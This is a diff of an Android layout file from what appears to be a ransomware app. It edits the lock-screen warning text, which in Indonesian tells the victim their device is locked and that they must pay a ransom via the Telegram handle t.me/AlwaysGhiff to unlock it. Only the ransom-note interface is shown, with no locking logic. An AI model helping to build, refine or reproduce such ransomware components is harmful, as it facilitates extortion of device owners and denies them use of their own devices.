@@ -13,8 +13,7 @@ main.xml
         android:id="@+id/warningText"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="️ Perangkat Anda Telah Terkunci 
-Bayar Tebusan Ke t.me/AlwaysGhiff Untuk Membukanya"
+        android:text="️ Perangkat Anda Telah Terkunci Bayar Tebusan Ke t.me/AlwaysGhiff Untuk Membukanya"
         android:textColor="#000000"
         android:textSize="20sp"
         android:padding="8dp"
